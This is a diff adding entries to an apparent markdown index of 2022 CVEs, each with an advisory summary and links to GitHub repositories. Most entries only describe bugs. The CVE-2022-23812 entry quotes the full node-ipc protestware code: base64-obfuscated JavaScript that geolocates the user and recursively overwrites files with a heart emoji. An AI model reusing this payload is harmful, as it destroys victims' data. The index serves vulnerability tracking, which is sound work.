@@ -9234,6 +9234,11 @@
 - [Live-Hack-CVE/CVE-2022-40113](https://github.com/Live-Hack-CVE/CVE-2022-40113)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-40113">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-40113">
 
 ---
+## CVE-2022-40111 (2022-09-06T17:15:00)
+> In TOTOLINK A3002R TOTOLINK-A3002R-He-V1.1.1-B20200824.0128 in the shadow.sample file, root is hardcoded in the firmware.
+- [Live-Hack-CVE/CVE-2022-40111](https://github.com/Live-Hack-CVE/CVE-2022-40111)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-40111">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-40111">
+
+---
 ## CVE-2022-40107 (2022-09-23T19:15:00)
 > Tenda i9 v1.0.0.8(3828) was discovered to contain a buffer overflow via the formexeCommand function. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted string.
 - [Live-Hack-CVE/CVE-2022-40107](https://github.com/Live-Hack-CVE/CVE-2022-40107)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-40107">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-40107">
@@ -9633,6 +9638,11 @@
 ## CVE-2022-39844 (2022-09-09T15:15:00)
 > Improper validation of integrity check vulnerability in Smart Switch PC prior to version 4.3.22083 allows local attackers to delete arbitrary directory using directory junction.
 - [Live-Hack-CVE/CVE-2022-39844](https://github.com/Live-Hack-CVE/CVE-2022-39844)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-39844">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-39844">
+
+---
+## CVE-2022-39843 (2022-09-05T07:15:00)
+> 123elf Lotus 1-2-3 before 1.0.0rc3 for Linux, and Lotus 1-2-3 R3 for UNIX and other platforms through 9.8.2, allow attackers to execute arbitrary code via a crafted worksheet. This occurs because of a stack-based buffer overflow in the cell format processing routines, as demonstrated by a certain function call from process_fmt() that can be reached via a w3r_format element in a wk3 document.
+- [Live-Hack-CVE/CVE-2022-39843](https://github.com/Live-Hack-CVE/CVE-2022-39843)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-39843">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-39843">
 
 ---
 ## CVE-2022-39842 (2022-09-05T07:15:00)
@@ -11774,6 +11784,11 @@
 - [Live-Hack-CVE/CVE-2022-38372](https://github.com/Live-Hack-CVE/CVE-2022-38372)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38372">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38372">
 
 ---
+## CVE-2022-38370 (2022-09-05T10:15:00)
+> Apache IoTDB grafana-connector version 0.13.0 contains an interface without authorization, which may expose the internal structure of database. Users should upgrade to version 0.13.1 which addresses this issue.
+- [Live-Hack-CVE/CVE-2022-38370](https://github.com/Live-Hack-CVE/CVE-2022-38370)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38370">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38370">
+
+---
 ## CVE-2022-38355 (2022-12-13T22:15:00)
 > Daikin SVMPC1 version 2.1.22 and prior and SVMPC2 version 1.2.3 and prior are vulnerable to attackers with access to the local area network (LAN) to disclose sensitive information stored by the affected product without requiring authentication.
 - [Live-Hack-CVE/CVE-2022-38355](https://github.com/Live-Hack-CVE/CVE-2022-38355)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38355">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38355">
@@ -11974,9 +11989,34 @@
 - [Live-Hack-CVE/CVE-2022-38266](https://github.com/Live-Hack-CVE/CVE-2022-38266)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38266">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38266">
 
 ---
+## CVE-2022-38260 (2022-09-08T17:15:00)
+> Interview Management System v1.0 was discovered to contain a SQL injection vulnerability via the component /interview/delete.php?action=questiondelete&id=.
+- [Live-Hack-CVE/CVE-2022-38260](https://github.com/Live-Hack-CVE/CVE-2022-38260)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38260">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38260">
+
+---
 ## CVE-2022-38256 (2022-09-08T18:15:00)
 > TastyIgniter v3.5.0 was discovered to contain a cross-site scripting (XSS) vulnerability which allows attackers to execute arbitrary web scripts or HTML via a crafted payload.
 - [Live-Hack-CVE/CVE-2022-38256](https://github.com/Live-Hack-CVE/CVE-2022-38256)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38256">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38256">
+
+---
+## CVE-2022-38255 (2022-09-08T16:15:00)
+> Interview Management System v1.0 was discovered to contain a SQL injection vulnerability via the id parameter at /interview/editQuestion.php.
+- [Live-Hack-CVE/CVE-2022-38255](https://github.com/Live-Hack-CVE/CVE-2022-38255)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38255">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38255">
+
+---
+## CVE-2022-38254 (2022-09-07T22:15:00)
+> Nagios XI before v5.8.7 was discovered to contain a cross-site scripting (XSS) vulnerability via the ajax.php script in CCM 3.1.5.
+- [Live-Hack-CVE/CVE-2022-38254](https://github.com/Live-Hack-CVE/CVE-2022-38254)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38254">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38254">
+
+---
+## CVE-2022-38251 (2022-09-07T22:15:00)
+> Nagios XI v5.8.6 was discovered to contain a cross-site scripting (XSS) vulnerability via the System Performance Settings page under the Admin panel.
+- [Live-Hack-CVE/CVE-2022-38251](https://github.com/Live-Hack-CVE/CVE-2022-38251)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38251">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38251">
+
+---
+## CVE-2022-38250 (2022-09-07T22:15:00)
+> Nagios XI v5.8.6 was discovered to contain a SQL injection vulnerability via the mib_name parameter at the Manage MIBs page.
+- [Live-Hack-CVE/CVE-2022-38250](https://github.com/Live-Hack-CVE/CVE-2022-38250)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38250">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38250">
 
 ---
 ## CVE-2022-3825 (2022-11-02T13:15:00)
@@ -12281,6 +12321,11 @@
 ## CVE-2022-38058 (2022-09-09T15:15:00)
 > Authenticated (subscriber+) Plugin Setting change vulnerability in WP Shamsi plugin <= 4.1.1 at WordPress.
 - [Live-Hack-CVE/CVE-2022-38058](https://github.com/Live-Hack-CVE/CVE-2022-38058)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38058">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38058">
+
+---
+## CVE-2022-38054 (2022-09-02T07:15:00)
+> In Apache Airflow versions 2.2.4 through 2.3.3, the `database` webserver session backend was susceptible to session fixation.
+- [Live-Hack-CVE/CVE-2022-38054](https://github.com/Live-Hack-CVE/CVE-2022-38054)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-38054">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-38054">
 
 ---
 ## CVE-2022-38046 (2022-10-11T19:15:00)
@@ -13198,6 +13243,11 @@
 - [Live-Hack-CVE/CVE-2022-37452](https://github.com/Live-Hack-CVE/CVE-2022-37452)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-37452">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-37452">
 
 ---
+## CVE-2022-37435 (2022-09-01T14:15:00)
+> Apache ShenYu Admin has insecure permissions, which may allow low-privilege administrators to modify high-privilege administrator's passwords. This issue affects Apache ShenYu 2.4.2 and 2.4.3.
+- [Live-Hack-CVE/CVE-2022-37435](https://github.com/Live-Hack-CVE/CVE-2022-37435)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-37435">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-37435">
+
+---
 ## CVE-2022-37434 (2022-08-05T07:15:00)
 > zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).
 - [nidhi7598/external_zlib-1.2.11_AOSP_10_r33_CVE-2022-37434](https://github.com/nidhi7598/external_zlib-1.2.11_AOSP_10_r33_CVE-2022-37434)	<img alt="forks" src="https://img.shields.io/github/forks/nidhi7598/external_zlib-1.2.11_AOSP_10_r33_CVE-2022-37434">	<img alt="stars" src="https://img.shields.io/github/stars/nidhi7598/external_zlib-1.2.11_AOSP_10_r33_CVE-2022-37434">
@@ -13638,6 +13688,11 @@
 ## CVE-2022-37129 (2022-08-31T23:15:00)
 > D-Link DIR-816 A2_v1.10CNB04.img is vulnerable to Command Injection via /goform/SystemCommand. After the user passes in the command parameter, it will be spliced into byte_4836B0 by snprintf, and finally doSystem(&byte_4836B0); will be executed, resulting in a command injection.
 - [Live-Hack-CVE/CVE-2022-37129](https://github.com/Live-Hack-CVE/CVE-2022-37129)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-37129">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-37129">
+
+---
+## CVE-2022-37125 (2022-08-31T22:15:00)
+> D-link DIR-816 A2_v1.10CNB04.img is vulnerable to Command injection via /goform/NTPSyncWithHost.
+- [Live-Hack-CVE/CVE-2022-37125](https://github.com/Live-Hack-CVE/CVE-2022-37125)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-37125">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-37125">
 
 ---
 ## CVE-2022-37123 (2022-08-31T23:15:00)
@@ -14305,6 +14360,16 @@
 - [Live-Hack-CVE/CVE-2022-36678](https://github.com/Live-Hack-CVE/CVE-2022-36678)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36678">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36678">
 
 ---
+## CVE-2022-36672 (2022-09-01T03:15:00)
+> Novel-Plus v3.6.2 was discovered to contain a hard-coded JWT key located in the project config file. This vulnerability allows attackers to create a custom user session.
+- [Live-Hack-CVE/CVE-2022-36672](https://github.com/Live-Hack-CVE/CVE-2022-36672)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36672">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36672">
+
+---
+## CVE-2022-36671 (2022-09-01T03:15:00)
+> Novel-Plus v3.6.2 was discovered to contain an arbitrary file download vulnerability via the background file download API.
+- [Live-Hack-CVE/CVE-2022-36671](https://github.com/Live-Hack-CVE/CVE-2022-36671)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36671">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36671">
+
+---
 ## CVE-2022-3667 (2022-10-26T19:15:00)
 > A vulnerability, which was classified as critical, was found in Axiomatic Bento4. This affects the function AP4_MemoryByteStream::WritePartial of the file Ap4ByteStream.cpp of the component mp42aac. The manipulation leads to heap-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-212007.
 - [Live-Hack-CVE/CVE-2022-3667](https://github.com/Live-Hack-CVE/CVE-2022-3667)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-3667">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-3667">
@@ -14360,6 +14425,11 @@
 - [Live-Hack-CVE/CVE-2022-3663](https://github.com/Live-Hack-CVE/CVE-2022-3663)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-3663">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-3663">
 
 ---
+## CVE-2022-36620 (2022-08-31T21:15:00)
+> D-link DIR-816 A2_v1.10CNB04.img is vulnerable to Buffer Overflow via /goform/addRouting.
+- [Live-Hack-CVE/CVE-2022-36620](https://github.com/Live-Hack-CVE/CVE-2022-36620)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36620">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36620">
+
+---
 ## CVE-2022-3662 (2022-10-26T19:15:00)
 > A vulnerability was found in Axiomatic Bento4. It has been declared as critical. This vulnerability affects the function GetOffset of the file Ap4Sample.h of the component mp42hls. The manipulation leads to use after free. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-212002 is the identifier assigned to this vulnerability.
 - [Live-Hack-CVE/CVE-2022-3662](https://github.com/Live-Hack-CVE/CVE-2022-3662)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-3662">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-3662">
@@ -14388,6 +14458,21 @@
 ## CVE-2022-3659 (2022-11-01T23:15:00)
 > Use after free in Accessibility in Google Chrome on Chrome OS prior to 107.0.5304.62 allowed a remote attacker who convinced a user to engage in specific UI interactions to potentially exploit heap corruption via specific UI interactions. (Chromium security severity: Medium)
 - [Live-Hack-CVE/CVE-2022-3659](https://github.com/Live-Hack-CVE/CVE-2022-3659)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-3659">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-3659">
+
+---
+## CVE-2022-36588 (2022-09-08T00:15:00)
+> In D-Link DAP1650 v1.04 firmware, the fileaccess.cgi program in the firmware has a buffer overflow vulnerability caused by strncpy.
+- [Live-Hack-CVE/CVE-2022-36588](https://github.com/Live-Hack-CVE/CVE-2022-36588)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36588">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36588">
+
+---
+## CVE-2022-36586 (2022-09-08T00:15:00)
+> In Tenda G3 US_G3V3.0br_V15.11.0.6(7663)_EN_TDE, there is a buffer overflow vulnerability caused by strcpy in function 0x869f4 in the httpd binary.
+- [Live-Hack-CVE/CVE-2022-36586](https://github.com/Live-Hack-CVE/CVE-2022-36586)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36586">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36586">
+
+---
+## CVE-2022-36585 (2022-09-07T23:15:00)
+> In Tenda G3 US_G3V3.0br_V15.11.0.6(7663)_EN_TDE, in httpd binary, the addDhcpRule function has a buffer overflow caused by sscanf.
+- [Live-Hack-CVE/CVE-2022-36585](https://github.com/Live-Hack-CVE/CVE-2022-36585)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36585">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36585">
 
 ---
 ## CVE-2022-3658 (2022-11-01T23:15:00)
@@ -15029,6 +15114,11 @@
 - [Live-Hack-CVE/CVE-2022-36133](https://github.com/Live-Hack-CVE/CVE-2022-36133)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36133">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36133">
 
 ---
+## CVE-2022-36130 (2022-09-01T02:15:00)
+> HashiCorp Boundary up to 0.10.1 did not properly perform data integrity checks to ensure the resources were associated with the correct scopes, allowing potential privilege escalation for authorized users of another scope. Fixed in Boundary 0.10.2.
+- [Live-Hack-CVE/CVE-2022-36130](https://github.com/Live-Hack-CVE/CVE-2022-36130)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36130">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36130">
+
+---
 ## CVE-2022-36123 (2022-07-29T14:15:00)
 > The Linux kernel before 5.18.13 lacks a certain clear operation for the block starting symbol (.bss). This allows Xen PV guest OS users to cause a denial of service or gain privileges.
 - [Live-Hack-CVE/CVE-2022-36123](https://github.com/Live-Hack-CVE/CVE-2022-36123)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36123">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36123">
@@ -15195,6 +15285,11 @@
 ## CVE-2022-3606 (2022-10-19T09:15:00)
 > A vulnerability was found in Linux Kernel. It has been classified as problematic. This affects the function find_prog_by_sec_insn of the file tools/lib/bpf/libbpf.c of the component BPF. The manipulation leads to null pointer dereference. It is recommended to apply a patch to fix this issue. The identifier VDB-211749 was assigned to this vulnerability.
 - [Live-Hack-CVE/CVE-2022-3606](https://github.com/Live-Hack-CVE/CVE-2022-3606)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-3606">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-3606">
+
+---
+## CVE-2022-36051 (2022-08-31T23:15:00)
+> ZITADEL combines the ease of Auth0 and the versatility of Keycloak.**Actions**, introduced in ZITADEL **1.42.0** on the API and **1.56.0** for Console, is a feature, where users with role.`ORG_OWNER` are able to create Javascript Code, which is invoked by the system at certain points during the login. **Actions**, for example, allow creating authorizations (user grants) on newly created users programmatically. Due to a missing authorization check, **Actions** were able to grant authorizations for projects that belong to other organizations inside the same Instance. Granting authorizations via API and Console is not affected by this vulnerability. There is currently no known workaround, users should update.
+- [Live-Hack-CVE/CVE-2022-36051](https://github.com/Live-Hack-CVE/CVE-2022-36051)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-36051">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-36051">
 
 ---
 ## CVE-2022-3605 (2022-12-12T18:15:00)
@@ -21165,6 +21260,21 @@
 - [Live-Hack-CVE/CVE-2022-29503](https://github.com/Live-Hack-CVE/CVE-2022-29503)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29503">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29503">
 
 ---
+## CVE-2022-29502 (2022-05-05T17:15:00)
+> SchedMD Slurm 21.08.x through 20.11.x has Incorrect Access Control that leads to Escalation of Privileges.
+- [Live-Hack-CVE/CVE-2022-29502](https://github.com/Live-Hack-CVE/CVE-2022-29502)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29502">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29502">
+
+---
+## CVE-2022-29501 (2022-05-05T17:15:00)
+> SchedMD Slurm 21.08.x through 20.11.x has Incorrect Access Control that leads to Escalation of Privileges and code execution.
+- [Live-Hack-CVE/CVE-2022-29501](https://github.com/Live-Hack-CVE/CVE-2022-29501)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29501">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29501">
+
+---
+## CVE-2022-29500 (2022-05-05T17:15:00)
+> SchedMD Slurm 21.08.x through 20.11.x has Incorrect Access Control that leads to Information Disclosure.
+- [Live-Hack-CVE/CVE-2022-29500](https://github.com/Live-Hack-CVE/CVE-2022-29500)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29500">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29500">
+
+---
 ## CVE-2022-2949 (2022-12-13T21:15:00)
 > Altair HyperView Player versions 2021.1.0.27 and prior are vulnerable to the use of uninitialized memory vulnerability during parsing of H3D files. A DWORD is extracted from an uninitialized buffer and, after sign extension, is used as an index into a stack variable to increment a counter leading to memory corruption.
 - [Live-Hack-CVE/CVE-2022-2949](https://github.com/Live-Hack-CVE/CVE-2022-2949)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-2949">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-2949">
@@ -21353,6 +21463,11 @@
 ## CVE-2022-29181 (2022-05-20T19:15:00)
 > Nokogiri is an open source XML and HTML library for Ruby. Nokogiri prior to version 1.13.6 does not type-check all inputs into the XML and HTML4 SAX parsers, allowing specially crafted untrusted inputs to cause illegal memory access errors (segfault) or reads from unrelated memory. Version 1.13.6 contains a patch for this issue. As a workaround, ensure the untrusted input is a `String` by calling `#to_s` or equivalent.
 - [Live-Hack-CVE/CVE-2022-29181](https://github.com/Live-Hack-CVE/CVE-2022-29181)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29181">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29181">
+
+---
+## CVE-2022-29158 (2022-09-02T07:15:00)
+> Apache OFBiz up to version 18.12.05 is vulnerable to Regular Expression Denial of Service (ReDoS) in the way it handles URLs provided by external, unauthenticated users. Upgrade to 18.12.06 or apply patches at https://issues.apache.org/jira/browse/OFBIZ-12599
+- [Live-Hack-CVE/CVE-2022-29158](https://github.com/Live-Hack-CVE/CVE-2022-29158)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-29158">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-29158">
 
 ---
 ## CVE-2022-29156 (2022-04-13T07:15:00)
@@ -23967,6 +24082,11 @@ For versions 9.34.0 and higher, an option to disable this functionality is provi
 - [Live-Hack-CVE/CVE-2022-2382](https://github.com/Live-Hack-CVE/CVE-2022-2382)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-2382">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-2382">
 
 ---
+## CVE-2022-23812 (2022-03-16T16:15:00)
+> This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from "path"; import a from "fs"; import o from "https"; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t > 1) { return; } const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString("utf8"), function (t) { t.on("data", function (t) { const n = Buffer.from("Li8=", "base64"); const o = Buffer.from("Li4v", "base64"); const r = Buffer.from("Li4vLi4v", "base64"); const f = Buffer.from("Lw==", "base64"); const c = Buffer.from("Y291bnRyeV9uYW1l", "base64"); const e = Buffer.from("cnVzc2lh", "base64"); const i = Buffer.from("YmVsYXJ1cw==", "base64"); try { const s = JSON.parse(t.toString("utf8")); const u = s[c.toString("utf8")].toLowerCase(); const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8")); // checks if country is Russia or Belarus if (a) { h(n.toString("utf8")); h(o.toString("utf8")); h(r.toString("utf8")); h(f.toString("utf8")); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = "", o = "") { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from("4p2k77iP", "base64"); for (var e = 0; e < r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length > 0 ? f.push(...s) : null; } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString("utf8"), function () {}); // overwrites file with ?? } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };
+- [Live-Hack-CVE/CVE-2022-23812](https://github.com/Live-Hack-CVE/CVE-2022-23812)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-23812">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-23812">
+
+---
 ## CVE-2022-23804 (2022-02-16T17:15:00)
 > A stack-based buffer overflow vulnerability exists in the Gerber Viewer gerber and excellon ReadIJCoord coordinate parsing functionality of KiCad EDA 6.0.1 and master commit de006fc010. A specially-crafted gerber or excellon file can lead to code execution. An attacker can provide a malicious file to trigger this vulnerability.
 - [Live-Hack-CVE/CVE-2022-23804](https://github.com/Live-Hack-CVE/CVE-2022-23804)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-23804">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-23804">
@@ -25289,6 +25409,11 @@ For versions 9.34.0 and higher, an option to disable this functionality is provi
 ## CVE-2022-21970 (2022-01-11T21:15:00)
 > Microsoft Edge (Chromium-based) Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21954.
 - [Malwareman007/CVE-2022-21970](https://github.com/Malwareman007/CVE-2022-21970)	<img alt="forks" src="https://img.shields.io/github/forks/Malwareman007/CVE-2022-21970">	<img alt="stars" src="https://img.shields.io/github/stars/Malwareman007/CVE-2022-21970">
+
+---
+## CVE-2022-21941 (2022-08-31T16:15:00)
+> All versions of iSTAR Ultra prior to version 6.8.9.CU01 are vulnerable to a command injection that could allow an unauthenticated user root access to the system.
+- [Live-Hack-CVE/CVE-2022-21941](https://github.com/Live-Hack-CVE/CVE-2022-21941)	<img alt="forks" src="https://img.shields.io/github/forks/Live-Hack-CVE/CVE-2022-21941">	<img alt="stars" src="https://img.shields.io/github/stars/Live-Hack-CVE/CVE-2022-21941">
 
 ---
 ## CVE-2022-2191 (2022-07-07T21:15:00)
